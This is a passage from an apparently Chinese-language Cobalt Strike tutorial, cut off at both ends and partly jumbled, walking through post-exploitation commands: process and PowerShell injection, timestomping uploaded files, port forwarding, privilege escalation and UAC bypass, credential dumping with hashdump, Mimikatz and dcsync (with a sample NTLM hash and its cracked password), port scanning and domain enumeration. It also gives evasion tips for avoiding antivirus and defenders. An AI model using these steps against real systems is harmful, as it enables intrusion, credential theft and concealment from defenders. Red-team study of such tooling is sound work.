2.\u4f7f\u7528inject\uff0c\u540e\u9762\u63a5\u8fdb\u7a0bID\u548c\u4fa6\u542c\u5668\u540d\u79f0\uff0c\u4ee5\u5c06\u4f1a\u8bdd\u6ce8\u5165\u5230\u7279\u5b9a\u8fdb\u7a0b\u4e2d\u3002 1.\u4f7f\u7528ps\u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u4e0a\u7684\u8fdb\u7a0b\u5217\u8868\u3002 2.\u4f7f\u7528inject [pid] x64\u5c0664\u4f4d\u4fe1\u6807\u6ce8\u5165\u5230x64\u8fdb\u7a0b\u4e2d\u3002\u4e5f\u53ef\u4ee5\u6ce8\u5165x86\u4e2d 3.\u8bbe\u7f6e\u76d1\u542c\u5668 4.\u6ce8\u5165\u6210\u529f\uff0c\u8fd4\u56de\u4e00\u4e2a\u65b0\u7684shell \u4e00\u4e2a\u5229\u7528\u624b\u6cd5\uff1a \u53d7\u5bb3\u7cfb\u7edf\u4e0a\u7684\u4efb\u4f55\u8fdb\u7a0b\u4e0b\u6267\u884cPowershell\u811a\u672c\u3002 1 psinject \u3010pid\u3011[ ps1] \u7eff\u8272\u7a81\u51fa\u663e\u793a\u7684\u662f\u5728\u6ce8\u5165powershell\u811a\u672c\u65f6\u5728\u76ee\u6807\u8fdb\u7a0b\u4e2d\u6253\u5f00\u7684\u65b0\u53e5\u67c4\uff1a spawn\u548cinject\u547d\u4ee4\u90fd\u5c06\u6709\u6548\u8f7d\u8377\u9636\u6bb5\u6ce8\u5165\u5230\u5185\u5b58\u4e2d\u3002\u5982\u679c\u6709\u6548\u8d1f\u8f7d\u9636\u6bb5\u662fHTTP\uff0c HTTPS\u6216DNS\u4fe1\u6807\uff0c\u5e76\u4e14\u5b83\u65e0\u6cd5\u5230\u8fbeCS-\u6211\u4eec\u5c06\u770b\u4e0d\u5230\u4f1a\u8bdd\u3002\u5982\u679c\u6709\u6548\u8d1f\u8f7d\u9636\u6bb5\u662f\u7ed1\u5b9a TCP\u6216SMB\u4fe1\u6807\uff0c\u5219\u8fd9\u4e9b\u547d\u4ee4\u5c06\u81ea\u52a8\u5c1d\u8bd5\u94fe\u63a5\u5e76\u627f\u62c5\u5bf9\u8fd9\u4e9b\u6709\u6548\u8d1f\u8f7d\u7684\u63a7\u5236\u3002 8.Runu\u5141\u8bb8\u6211\u4eec\u4ece\u6307\u5b9a\u7684\u7236\u8fdb\u7a0b\u542f\u52a8\u65b0\u8fdb\u7a0b\uff1a 8.Upload and Download Files \u4e0b\u8f7ddownload runu [pid] \u65b0\u8fdb\u7a0b download [\u76ee\u6807\u6587\u4ef6\u76ee\u5f55] 1 1 \u4fe1\u6807\u662f\u4e3a\u4f4e\u901f\u548c\u6162\u901f\u6570\u636e\u6cc4\u9732\u800c\u6784\u5efa\u7684\u3002\u5728\u6bcf\u6b21\u7b7e\u5165\u8fc7\u7a0b\u4e2d\uff0cBeacon\u4f1a\u4e0b\u8f7d\u4efb\u52a1\u6307\u5b9a\u8981 \u83b7\u53d6\u7684\u6bcf\u4e2a\u6587\u4ef6\u7684\u56fa\u5b9a\u5757\u3002\u8be5\u5757\u7684\u5927\u5c0f\u53d6\u51b3\u4e8e\u4fe1\u6807\u7684\u5f53\u524d\u6570\u636e\u901a\u9053\u3002HTTP\u548cHTTPS\u901a \u9053\u4ee5512KB\u7684\u5757\u5f62\u5f0f\u63d0\u53d6\u6570\u636e\u3002 \u8f6c\u5230\u67e5\u770b-> Cobalt Strike\u4e2d\u7684\u4e0b\u8f7d\uff0c\u4ee5\u67e5\u770b\u60a8\u7684\u56e2\u961f\u5230\u76ee\u524d\u4e3a\u6b62\u5df2\u4e0b\u8f7d\u7684\u6587\u4ef6\u3002\u6b64\u9009\u9879 \u5361\u4e2d\u4ec5\u663e\u793a\u5b8c\u6210\u7684\u4e0b\u8f7d\u3002\u4e0b\u8f7d\u7684\u6587\u4ef6\u5b58\u50a8\u5728\u56e2\u961f\u670d\u52a1\u5668\u4e0a\u3002\u8981\u5c06\u6587\u4ef6\u5e26\u56de\u7cfb\u7edf\uff0c\u8bf7\u5728\u6b64 \u5904\u7a81\u51fa\u663e\u793a\u5b83\u4eec\uff0c\u7136\u540e\u6309Sync Files\u3002\u7136\u540e\uff0cCobalt Strike\u5c06\u9009\u62e9\u7684\u6587\u4ef6\u4e0b\u8f7d\u5230\u7cfb\u7edf\u4e0a\u60a8 \u9009\u62e9\u7684\u6587\u4ef6\u5939\u4e2d\u3002 \u4e0a\u4f20\u6587\u4ef6upload 1 upload [/path/to/file] \u4e0a\u4f20\u6587\u4ef6\u65f6\uff0c\u6709\u65f6\u4f1a\u9700\u8981\u66f4\u65b0\u5176\u65f6\u95f4\u6233\uff0c\u4ee5\u4f7f\u5176\u4e0e\u540c\u4e00\u6587\u4ef6\u5939\u4e2d\u7684\u5176\u4ed6\u6587\u4ef6\u878d\u5408\u3002 \u53ef\u4ee5\u4f7f\u7528timestomp\u547d\u4ee4\u6267\u884c\u6b64\u64cd\u4f5c\u3002 timestomp\u547d\u4ee4\u4f1a\u5c06\u4e00\u4e2a\u6587\u4ef6\u7684\u201c\u4fee\u6539\u201d\uff0c\u201c\u8bbf\u95ee\u201d\u548c\u201c\u521b\u5efa\u201d\u65f6\u95f4\u4e0e\u53e6\u4e00\u4e2a\u6587\u4ef6\u8fdb\u884c\u5339\u914d\u3002 9.\u6587\u4ef6\u7cfb\u7edf\u547d\u4ee4 \u4f7f\u7528ls\u547d\u4ee4\u5217\u51fa\u5f53\u524d\u76ee\u5f55\u4e2d\u7684\u6587\u4ef6\u3002\u4f7f\u7528mkdir\u521b\u5efa\u76ee\u5f55\u3002rm\u5c06\u5220\u9664\u6587\u4ef6\u6216\u6587\u4ef6\u5939\u3002cp\u5c06 \u6587\u4ef6\u590d\u5236\u5230\u76ee\u6807\u4f4d\u7f6e\u3002mv\u79fb\u52a8\u6587\u4ef6\u3002 10.\u53cd\u5411\u67a2\u8f74 \u7aef\u53e3\u505c\u6b62\u3010\u7ed1\u5b9a\u7aef\u53e3\u3011 \u5728\u76ee\u6807\u4e3b\u673a\u4e0a\u7ed1\u5b9a\u6307\u5b9a\u7684\u7aef\u53e3\u3002\u5f53\u8fde\u63a5\u8fdb\u6765\u65f6\uff0cCobaltStrike\u5c06\u8fde\u63a5\u5230\u8f6c\u53d1\u7684\u4e3b\u673a/\u7aef\u53e3\u5e76 \u4f7f\u7528Beacon\u5728\u4e24\u4e2a\u8fde\u63a5\u4e4b\u95f4\u4e2d\u7ee7\u901a\u4fe1\u3002 \u4f7f\u7528rportfwd stop [bind port]\u7981\u7528\u53cd\u5411\u7aef\u53e3\u8f6c\u53d1\u3002 11.\u751f\u6210\u548c\u96a7\u9053 \u4f7f\u7528spunnel\u547d\u4ee4\u53ef\u5728\u4e34\u65f6\u8fc7\u7a0b\u4e2d\u751f\u6210\u7b2c\u4e09\u65b9\u5de5\u5177\uff0c\u5e76\u4e3a\u5176\u521b\u5efa\u53cd\u5411\u7aef\u53e3\u3002 \u8be5\u547d\u4ee4\u671f\u671b\u4ee3\u7406\u6587\u4ef6\u662f\u4e0e\u4f4d\u7f6e\u65e0\u5173\u7684shellcode\uff08\u901a\u5e38\u662f\u6765\u81ea\u53e6\u4e00\u4e2a\u653b\u51fb\u5e73\u53f0\u7684\u539f\u59cb\u8f93 \u51fa\uff09\u3002\u8be5spunnel_local\u547d\u4ee4\u662f\u4e00\u6837\u7684spunnel\uff0c\u9664\u4e86\u5b83\u5f00\u59cb\u4ece\u4f60\u7684cs\u5ba2\u6237\u7aef\u63a7\u5236\u5668\u8fde\u63a5\u3002 timestomp [fileA] [fileB] \u4f7f\u7528\uff1arportfwd [\u7ed1\u5b9a\u7aef\u53e3] [\u8f6c\u53d1\u4e3b\u673a] [\u8f6c\u53d1\u7aef\u53e3] \u8bed\u6cd5\u4e3aspunnel [x86\u6216x64] [controller host] [controller port] [/path/to/agent. 1 1 1 \u901a\u8fc7Cobalt Strike\u5ba2\u6237\u7aef\u4e0e\u5176\u56e2\u961f\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u8fde\u63a5\u6765\u901a\u4fe1spunnel_local\u901a\u4fe1\u3002 12.\u7279\u6743\u63d0\u5347 \u5229\u7528\u6f0f\u6d1e\u63d0\u5347 \u8f93\u5165elevate\u547d\u4ee4\u4ee5\u5217\u51fa\u5728Cobalt Strike\u4e2d\u6ce8\u518c\u7684\u7279\u6743\u5347\u7ea7\u6f0f\u6d1e\u3002 \u6210\u529f\u4e4b\u540e\u4f1a\u53cd\u5f39\u65b0\u7684\u4f1a\u8bdd\u56de\u6765 \u5355\u72ec\u4f7f\u7528runasadmin\u547d\u4ee4\u53ef\u4ee5\u5217\u51fa\u5728Cobalt Strike\u4e2d\u7684\u6f0f\u6d1e\u3002 1 \u8fd0\u884celevate [exploit] [listener]\u5c1d\u8bd5\u63d0\u5347\u7279\u5b9a\u7684\u5229\u7528\u3002 \u8fd0\u884crunasadmin [exploit] [command + args]\u5c1d\u8bd5bypassUac\u63d0\u6743\u3002 \u4f7f\u7528\u5df2\u77e5\u51ed\u8bc1\u63d0\u5347 \u4f7f\u7528runas [DOMAIN user] [password] [command]\u4ee5\u5176\u4ed6\u7528\u6237\u7684\u8eab\u4efd\u8fd0\u884c\u547d\u4ee4\u3002 runas\u547d\u4ee4\u5c06\u4e0d\u8fd4\u56de\u4efb\u4f55\u8f93\u51fa\u3002 \u8fd9\u91cc\u7ed9\u4e2a\u624b\u6cd5\uff1a\u53ef\u4ee5\u4f7f\u7528poweshell \u8fdc\u7a0b\u6267\u884c\u4e0a\u7ebf \u4f7f\u7528spawnas [DOMAIN user] [password] [listener]\u4f7f\u7528\u5176\u51ed\u636e\u4ee5\u53e6\u4e00\u4e2a\u7528\u6237\u7684\u8eab\u4efd\u751f\u6210 \u4f1a\u8bdd\u3002\u6b64\u547d\u4ee4\u4ea7\u751f\u4e00\u4e2a\u4e34\u65f6\u8fdb\u7a0b\uff0c\u5e76\u5c06\u6211\u4eec\u7684\u6709\u6548\u8d1f\u8f7d\u9636\u6bb5\u6ce8\u5165\u8fdb\u7a0b\u4e2d\u3002 \u4e5f\u53ef\u4ee5\u8f6c\u5230[beacon]-> Access-> Spawn As\u4e5f\u8fd0\u884c\u6b64\u547d\u4ee4\u3002 \u4f7f\u7528\u547d\u4ee4 \u4f7f\u7528getsystem\u6a21\u62dfSYSTEM\u5e10\u6237\u7684\u4ee4\u724c\u3002\u8fd9\u79cd\u8bbf\u95ee\u6743\u9650\u7ea7\u522b\u53ef\u4ee5\u8ba9\u6211\u4eec\u6267\u884c\u7279\u6743\u64cd\u4f5c\uff0c \u800c\u8fd9\u4e9b\u64cd\u4f5c\u662f\u7ba1\u7406\u5458\u7528\u6237\u65e0\u6cd5\u6267\u884c\u7684\u3002 \u5177\u4f53\u6210\u529f\u4e0e\u5426\u770b\u5b9e\u9645\u73af\u5883 \u83b7\u53d6SYSTEM\u7684\u53e6\u4e00\u79cd\u65b9\u6cd5\u662f\u521b\u5efa\u8fd0\u884c\u6709\u6548\u8d1f\u8f7d\u7684\u670d\u52a1\u3002 \u5b83\u5c06\u5220\u9664\u8fd0\u884c\u6709\u6548\u8d1f\u8f7d\u7684\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u521b\u5efa\u670d\u52a1\u4ee5\u8fd0\u884c\u5b83\uff0c\u627f\u62c5\u5bf9\u6709\u6548\u8d1f\u8f7d\u7684\u63a7\u5236\uff0c\u5e76 \u6e05\u7406\u670d\u52a1\u548c\u53ef\u6267\u884c\u6587\u4ef6\u3002 13.UAC\u7ed5\u8fc7 Microsoft\u5728Windows Vista\u4e2d\u5f15\u5165\u4e86\u7528\u6237\u5e10\u6237\u63a7\u5236\uff08UAC\uff09\u5e76\u5728Windows 7\u4e2d\u5bf9\u5176\u8fdb\u884c\u4e86 \u6539\u8fdb\u3002UAC\u7684\u5de5\u4f5c\u539f\u7406\u4e0eUNIX\u4e2d\u7684sudo\u76f8\u4f3c\u3002\u7528\u6237\u6bcf\u5929\u90fd\u4ee5\u666e\u901a\u7279\u6743\u5de5\u4f5c\u3002\u5f53\u7528\u6237\u9700\u8981 \u6267\u884c\u7279\u6743\u64cd\u4f5c\u65f6\uff0c\u7cfb\u7edf\u4f1a\u8be2\u95ee\u4ed6\u4eec\u662f\u5426\u8981\u63d0\u5347\u5176\u6743\u9650\u3002 Cobalt Strike\u9644\u5e26\u4e86\u4e24\u6b21UAC\u65c1\u8def\u653b\u51fb\u3002 ELEVATE SVC-EXE [\u76d1\u542c] elevate uac-token-duplication [listener] runasadmin uac-token-duplication [command] runasadmin uac-cmstplua [comman 1 1 2 elevate uac-token-duplication [listener] \u5c06\u4ea7\u751f\u4e00\u4e2a\u6743\u9650\u63d0\u5347\u7684\u4e34\u65f6\u8fdb\u7a0b\uff0c\u5e76\u5411\u5176\u4e2d\u6ce8\u5165\u6709\u6548\u8d1f\u8f7d\u9636\u6bb5\u3002\u6b64\u653b\u51fb\u4f7f\u7528 UAC\u6f0f\u6d1e\uff0c\u8be5\u6f0f\u6d1e\u5141\u8bb8\u672a\u63d0\u5347\u7684\u8fdb\u7a0b\u4f7f\u7528\u4ece\u63d0\u5347\u7684\u8fdb\u7a0b\u7a83\u53d6\u7684\u4ee4\u724c\u542f\u52a8\u4efb\u610f \u8fdb\u7a0b\u3002\u6b64\u6f0f\u6d1e\u9700\u8981\u653b\u51fb\u624d\u80fd\u5220\u9664\u5206\u914d\u7ed9\u63d0\u5347\u4ee4\u724c\u7684\u591a\u4e2a\u6743\u9650\u3002\u65b0\u4f1a\u8bdd\u7684\u529f\u80fd \u5c06\u53cd\u6620\u8fd9\u4e9b\u53d7\u9650\u5236\u7684\u6743\u5229\u3002\u5982\u679c\u59cb\u7ec8\u901a\u77e5\u5904\u4e8e\u6700\u9ad8\u8bbe\u7f6e\uff0c\u5219\u6b64\u653b\u51fb\u8981\u6c42\u5f53\u524d \u684c\u9762\u4f1a\u8bdd\u4e2d\u5df2\u7ecf\u4ee5\u540c\u4e00\u7528\u6237\u8eab\u4efd\u8fd0\u884c\u4e86\u63d0\u5347\u7684\u8fdb\u7a0b\u3002 \u6b64\u653b\u51fb\u9002\u7528\u4e8e2018\u5e7411\u6708\u66f4\u65b0\u4e4b\u524d\u7684Windows 7\u548cWindows 10\u3002 \u8981\u68c0\u67e5\u5f53\u524d\u7528\u6237\u662f\u5426\u5728Administrators\u7ec4\u4e2d\uff0c\u8bf7\u4f7f\u7528shell whoami / groups\u3002 \u4f7f\u7528elevate uac-token-duplication msf1 \u8fd4\u56de\u4e00\u4e2a\u65b0\u7684\u4f1a\u8bdd \u5982\u679c\u4e0d\u5728Administrators\u7ec4\u4e2d \u76ee\u6807\u673a\u5668\u5f39\u51faUAC\uff0c\u65e0\u6cd5\u5229\u7528 runasadmin uac-token-duplication [command] /runasadmin uac-cmstplua [command] \u4e0e\u4e0a\u8ff0\u653b\u51fb\u76f8\u540c\uff0c\u4f46\u662f\u6b64\u5229\u7528\u6210\u529f\u4e0d\u4f1a\u8fd4\u56de\u4e00\u4e2a\u65b0\u7684\u4f1a\u8bdd\u800c\u662f\u5728\u63d0\u5347\u7684\u73af\u5883\u4e2d\u8fd0\u884c\u6211\u4eec \u8981\u9009\u62e9\u7684\u547d\u4ee4\u3002 \u5229\u7528\u6761\u4ef6\u4e5f\u662f\u548c\u524d\u9762\u4e00\u6837 \u5982\u679c\u4e0d\u5728Administrators\u7ec4\u4e2d 14.getprivs \u6bcf\u4e2a\u7cfb\u7edf\u90fd\u6709\u4e00\u4e2a\u5e10\u6237\u6570\u636e\u5e93\uff0c\u7528\u4e8e\u5b58\u50a8\u7528\u6237\u5e10\u6237\u548c\u7ec4\u5e10\u6237\u6240\u62e5\u6709\u7684\u7279\u6743\u3002\u5f53\u7528\u6237\u767b\u5f55 \u65f6\uff0c\u7cfb\u7edf\u4f1a\u751f\u6210\u4e00\u4e2a\u8bbf\u95ee\u4ee4\u724c\uff0c\u5176\u4e2d\u5305\u542b\u7528\u6237\u7279\u6743\u7684\u5217\u8868\uff0c\u5305\u62ec\u6388\u4e88\u7528\u6237\u6216\u7528\u6237\u6240\u5c5e\u7ec4 \u7684\u7279\u6743\u3002\u8bf7\u6ce8\u610f\uff0c\u7279\u6743\u4ec5\u9002\u7528\u4e8e\u672c\u5730\u8ba1\u7b97\u673a\u3002\u57df\u5e10\u6237\u5728\u4e0d\u540c\u7684\u8ba1\u7b97\u673a\u4e0a\u53ef\u4ee5\u5177\u6709\u4e0d\u540c\u7684 \u7279\u6743\u3002 \u5f53\u7528\u6237\u5c1d\u8bd5\u6267\u884c\u7279\u6743\u64cd\u4f5c\u65f6\uff0c\u7cfb\u7edf\u68c0\u67e5\u7528\u6237\u7684\u8bbf\u95ee\u4ee4\u724c\u4ee5\u786e\u5b9a\u8be5\u7528\u6237\u662f\u5426\u62e5\u6709\u5fc5\u8981\u7684\u7279 \u6743\uff0c\u5982\u679c\u662f\uff0c\u5219\u68c0\u67e5\u662f\u5426\u542f\u7528\u4e86\u7279\u6743\u3002\u5982\u679c\u7528\u6237\u672a\u901a\u8fc7\u8fd9\u4e9b\u6d4b\u8bd5\uff0c\u5219\u7cfb\u7edf\u4e0d\u4f1a\u6267\u884c\u8be5\u64cd \u4f5c\u3002 \u5728CS\u79cd\u53ef\u4ee5\u4f7f\u7528getprivs\u6765\u786e\u5b9a\u8bbf\u95ee\u4ee4\u724c\u662f\u5426\u6301\u6709\u6307\u5b9a\u7684\u7279\u6743\u96c6\u3002 \u5173\u4e8ePrivileges\u7684\u653b\u51fb\u65b9\u6cd5\uff0c\u672c\u6587\u4e0d\u591a\u63cf\u8ff0\uff0c\u6709\u5174\u8da3\u7684\u53ef\u4ee5\u67e5\u770b\u6211\u7684\u53e6\u4e00\u7bc7\u6587\u7ae0\u3002 15.\u51ed\u636e\u5bfc\u51fa \u51ed\u636e\u8bf4\u7684\u901a\u4fd7\u6613\u61c2\u4e00\u70b9\uff0c\u53ef\u4ee5\u7406\u89e3\u4e3a\u76ee\u6807\u673a\u7684\u8d26\u53f7\uff0c\u5bc6\u7801 \u51ed\u636e\u5bfc\u51fa\u662f\u6e17\u900f\u6d4b\u8bd5\u4e2d\u5373\u4e3a\u91cd\u8981\u7684\u6b65\u9aa4\uff0c\u5bfc\u51fa\u76ee\u6807\u673a\u51ed\u636e\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u51ed\u636e\u5b9e\u73b0\u6a2a \u5411\u79fb\u52a8\uff08\u5229\u7528hash\u4f20\u9012\uff0csmb/rdp\u7206\u7834\u7b49\u7b49\u624b\u6cd5\uff09\u6765\u6269\u5927\u6211\u4eec\u7684\u6218\u679c windows\u901a\u5e38\u4f7f\u7528\u4e24\u79cd\u65b9\u6cd5\u5bf9\u7528\u6237\u7684\u5bc6\u7801\u8fdb\u884c\u52a0\u5bc6\uff0c\u5728\u57df\u73af\u5883\u4e2d\uff0c\u7528\u6237\u4fe1\u606f\u52a0\u5bc6\u6210\u6563\u5217\u503c \u540e\u5b58\u5728ntds.dit\u4e2d\u3002 windows\u5bc6\u7801\u7ec4\u6210\uff1a windows hash \u7ed3\u6784\uff1a \u6ce8\u610f\uff1a LM hash \uff08DES\u52a0\u5bc6\uff09\uff0cNTLM hash \uff08MD4\uff09\u5177\u4f53\u624b\u6cd5\u770b\u5b9e\u6218\u73af\u5883 username\uff1aRID\uff1alm-hash\uff1ant-hash 1 1 \u4ecewindows vita \u548cwindows server 2008 \u5f00\u59cb windows\u5c31\u9ed8\u8ba4\u7981\u7528LM-hash\u4e86\uff08\u91cd\u70b9\uff1a\u8fd9 \u91cc\u662f\u7981\u7528 \u4e0d\u662f\u5f03\u7528\uff09\u6539\u7528NTLM hash\u8ba4\u8bc1\u4e86 LM-hash\u660e\u6587\u5bc6\u7801\u9650\u572814\u4f4d\uff08\u5b89\u5168\u6027\u4e0d\u9ad8\uff09 \u8fd8\u6709\u4e00\u70b9\uff1a\u5982\u679c\u7981\u7528LM-hash\u4e86\uff0c\u90a3\u4e48\u6211\u4eec\u53ea\u80fd\u6349\u5230aad3b435b51404eeaad51404ee\u3002 \u5f53\u7136\u4e5f\u53ef\u80fd\u662fLM-hash\u4e3a\u7a7a\u503c\u3002 \u5982\u679c\u76ee\u6807\u5173\u95ed\u4e86Wdigest\u529f\u80fd/\u5b89\u88c5\u4e86\u8865\u4e01kb2871997\u7684\u8bdd\u662f\u65e0\u6cd5\u4ece\u5185\u5b58\u4e2ddump\u660e\u6587\u5bc6\u7801 \u7684\u3002Windows server 2012\u4ee5\u4e0a\u9ed8\u8ba4\u5173\u95edWdigest\u529f\u80fd\u3002 \u6761\u4ef6\uff1a\u6743\u9650\u4e00\u5b9a\u5f97\u662fsystem\u6743\u9650 \u539f\u7406\uff1a\u672c\u5730\u7684\u7528\u6237\u540d\uff0c\u6563\u5217\u503c\u548c\u5176\u5b83\u5b89\u5168\u4fe1\u606f\u90fd\u5b58\u5728 SAM\uff08c:\\windows\\system32\\config\uff09\u6587\u4ef6\u4e2d\uff0clsass.exe\u8fdb\u7a0b\u7528\u4e8e\u5b9e\u73b0Windows\u7684\u5b89\u5168\u7b56 \u7565\uff08\u672c\u5730\u548c\u767b\u5f55\u7b56\u7565\uff09\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5de5\u5177\u628a\u6563\u5217\u503c\u548c\u660e\u6587\u5bc6\u7801\u4ece\u5185\u5b58\u4e2d\u7684 lsass.exe\u8fdb\u7a0b/SAM\u6587\u4ef6\u4e2d\u5bfc\u51fa Hashdump\u5bfc\u51fahash \u9009\u62e9beacon\u4f1a\u8bdd\u53f3\u952e,\u9009\u62e9\u6267\u884c\u2013>\u8f6c\u50a8Hash\uff0c\u6216\u5728beacon\u4e2d\u8f93\u5165hashdump \u5982\u56febeacon\u4f1a\u8bdd\u6846\u8f93\u51fa\u4e86\u76ee\u6807\u673a\u7684\u7528\u6237\u540d\u548c\u5bc6\u7801hash\u503c \u4ee5\u672c\u6b21\u5bfc\u51fa\u7684\u4e00\u4e2a\u51ed\u636e\u4e3a\u4f8b f4bb18c1165a89248f9e853b269a8995\u4e3aadmin\u7528\u6237\u7684NTLM Hash \u6211\u4eec\u53ef\u4ee5\u53bbcmd5\u7b49\u5e73\u53f0\u7834\u89e3\u8be5NTLM\u5bc6\u6587\uff0c\u5982\u56fe\uff0c\u7834\u89e3\u540e\u660e\u6587\u4e3aAbc123 Mimikatz\u5bfc\u51fa\u51ed\u636e \u9009\u62e9\u6267\u884c\u2013>Run Mimikatz\uff0c\u6216\u5728beacon\u4e2d\u6267\u884clogonpasswords\u547d\u4ee4\u5f53\u4f1a\u8bdd\u4e3a\u7ba1\u7406\u5458\u6743\u9650 \u65f6\uff0c\u624d\u80fddump\u6210\u529f\uff0c\u5982\u679c\u6743\u9650\u5f88\u4f4e\uff0c\u8bf7\u5148\u63d0\u6743\uff0c\u7136\u540e\u5728\u5b9e\u6218\u4e2d\u4f7f\u7528\u8981\u8fdb\u884c\u514d\u6740\u5904\u7406\u3002 1 admin:1022:aad3b435b51404eeaad3b435b51404ee:f4bb18c1165a89248f9e853b269a8995: \u4e5f\u53ef\u4ee5\u5728beacon\u4e2d\u8f93\u5165\u547d\u4ee4 \u4f7f\u7528dcsync [DOMAIN.FQDN]\u4ece\u57df\u63a7\u5236\u5668\u63d0\u53d6\u6240\u6709\u5e10\u6237\u7684\u5bc6\u7801\u54c8\u5e0c\u3002 \u6b64\u6280\u672f\u4f7f\u7528Windows API\u6765\u5728\u57df\u63a7\u5236\u5668\u4e4b\u95f4\u540c\u6b65\u4fe1\u606f\u3002\u5b83\u9700\u8981\u57df\u7ba1\u7406\u5458\u4fe1\u4efb\u5173\u7cfb\u3002 CS\u4e2d\u4f7f\u7528mimikatz\u6765\u6267\u884c\u6b64\u6280\u672f\u3002 \u4f7f\u7528\u6761\u4ef6\uff1aadministrator\u7528\u6237\u6743\u9650 \u4f8b\u5982\uff1a\u5728administrator\u6743\u9650\u4e2d\u4f7f\u7528 \u5728system\u6743\u9650\u4e2d \u5982\u679c\u8981\u7279\u5b9a\u7684\u5bc6\u7801\u54c8\u5e0c\uff0c\u8bf7\u4f7f\u7528 dcsync [DOMAIN.FQDN] [DOMAIN user]\u3002 \u4f8b\u5982\uff1a\u6211\u4eec\u62ffmssql\u7684 16.\u7aef\u53e3\u626b\u63cf cs\u5177\u6709\u5185\u7f6e\u7684\u7aef\u53e3\u626b\u63cf\u7a0b\u5e8f\u3002 \u53ef\u4ee5\u6307\u5b9a\u76ee\u6807\u8303\u56f4\u7684\u9017\u53f7\u5206\u9694\u5217\u8868\u3002\u7aef\u53e3\u4e5f\u662f\u5982\u6b64\u3002\u4f8b\u5982\uff0c\u7aef\u53e3\u626b\u63cf172.16.48.0/24 1- 1024,8080\u5c06\u626b\u63cf\u7aef\u53e31\u81f31024\u548c8080\u4e0a\u7684\u4e3b\u673a172.16.48.0\u81f3172.16.48.255\u3002 \u6709\u4e09\u4e2a\u76ee\u6807\u53d1\u73b0\u9009\u9879\u3002 \u4f7f\u7528portscan [\u76ee\u6807] [\u7aef\u53e3] [\u53d1\u73b0\u65b9\u6cd5]\u542f\u52a8\u7aef\u53e3\u626b\u63cf\u7a0b\u5e8f\u4f5c\u4e1a\u3002 arp\u65b9\u6cd5\u4f7f\u7528ARP\u8bf7\u6c42\u6765\u53d1\u73b0\u4e3b\u673a\u662f\u5426\u8fd8\u6d3b\u7740\u3002 1 1 2 \u7aef\u53e3\u626b\u63cf\u5668\u5c06\u5728beacon\u4e4b\u95f4\u8fd0\u884c\u3002\u5f53\u6709\u8981\u62a5\u544a\u7684\u7ed3\u679c\u65f6\uff0c\u5b83\u5c06\u628a\u5b83\u4eec\u53d1\u9001\u5230\u63a7\u5236\u53f0\u3002 Cobalt Strike\u5c06\u5904\u7406\u6b64\u4fe1\u606f\uff0c\u5e76\u4f7f\u7528\u53d1\u73b0\u7684\u4e3b\u673a\u66f4\u65b0\u76ee\u6807\u3002 \u6ce8\u610f\uff1a\u626b\u63cf\u7684\u4e0d\u540c\u65b9\u6cd5\u6709\u4e0d\u540c\u7684\u52a8\u4f5c\uff08\u6d41\u91cf\uff09\uff0c\u626b\u63cf\u53ef\u80fd\u4f1a\u8ba9\u84dd\u65b9\u68c0\u6d4b\u5e76\u53d1\u73b0\u6211\u4eec\u3002\u4f7f \u7528\u4e4b\u524d\u5e94\u8be5\u6ce8\u610f\u3002\u53ef\u4ee5\u5728\u665a\u4e0a\u8fdb\u884c\u626b\u63cf\u3002 \u4f8b\u5982\uff1a icmp\u65b9\u6cd5\u53d1\u9001ICMP\u56de\u663e\u8bf7\u6c42\uff0c\u4ee5\u68c0\u67e5\u76ee\u6807\u662f\u5426\u5b58\u5728\u3002 none\u9009\u9879\u544a\u8bc9portscan\u5de5\u5177\u5047\u5b9a\u6240\u6709\u4e3b\u673a\u5747\u5904\u4e8e\u6d3b\u52a8\u72b6\u6001\u3002 3 4 5 17.\u7f51\u7edc\u548c\u4e3b\u673a\u679a\u4e3e \u4fe1\u6807\u7f51\u7edc\u6a21\u5757\u63d0\u4f9b\u4e86\u5728Windows\u6d3b\u52a8\u76ee\u5f55\u7f51\u7edc\u4e2d\u67e5\u8be2\u548c\u53d1\u73b0\u76ee\u6807\u7684\u5de5\u5177\u3002 net\u547d\u4ee4\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528help net \u547d\u4ee4\u770b\u770b \u4fe1\u6807\u7684\u4e3b\u673a\u548c\u7f51\u7edc\u679a\u4e3e\u5de5\u5177\u3002\u5185\u7f6e\u7684net\u547d\u4ee4\u5305\u62ec\uff1a 1 \u8bed\u6cd5\uff1anet [command \u547d\u4ee4] [arguments/\u53c1\u6570] \u4f7f\u7528net dclist\u547d\u4ee4\u67e5\u627e\u76ee\u6807\u52a0\u5165\u5230\u7684\u57df\u7684\u57df\u63a7\u5236\u5668\u3002 Command Description computers lists hosts in a domain (groups) domain display domain for this host dclist lists domain controllers domain_controllers lists DCs in a domain (groups) domain_trusts lists domain trusts group lists groups and users in groups localgroup lists local groups and users in local groups logons lists users logged onto a host sessions lists sessions on a host share lists shares on a host user lists users and user information time show time for a host view lists hosts in a domain (browser service) 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u4f7f\u7528net view\u547d\u4ee4\u5728\u76ee\u6807\u52a0\u5165\u7684\u57df\u4e2d\u67e5\u627e\u76ee\u6807\u3002 \u8fd9\u4e24\u4e2a\u547d\u4ee4\u4e5f\u5c06\u586b\u5145\u76ee\u6807\u6a21\u578b\u3002 \u8be5\u547d\u4ee4\u901a\u8fc7\u5728\u57df\u63a7\u5236\u5668\u4e0a\u67e5\u8be2\u8ba1\u7b97\u673a\u5e10\u6237\u7ec4\u627e\u5230\u76ee\u6807\u3002 cs\u7684net\u6a21\u5757\u5305\u542b\u5728Windows\u7f51\u7edc\u679a\u4e3eAPI\u4e4b\u4e0a\u6784\u5efa\u7684\u547d\u4ee4\u3002\u8fd9\u4e9b\u547d\u4ee4\u662fWindows\u4e2d\u8bb8\u591a \u5185\u7f6enet\u547d\u4ee4\u7684\u76f4\u63a5\u66ff\u4ee3\u3002 \u8fd9\u91cc\u4e5f\u6709\u4e00\u4e9b\u72ec\u7279\u7684\u529f\u80fd\uff0c\u5f53\u6211\u4eec\u5fc5\u987b\u67e5\u627e\u8c01\u662f\u53e6\u4e00\u4e2a\u7cfb\u7edf\u4e0a\u7684\u672c\u5730\u7ba1\u7406\u5458\u65f6\uff0c\u8fd9\u4e9b\u547d 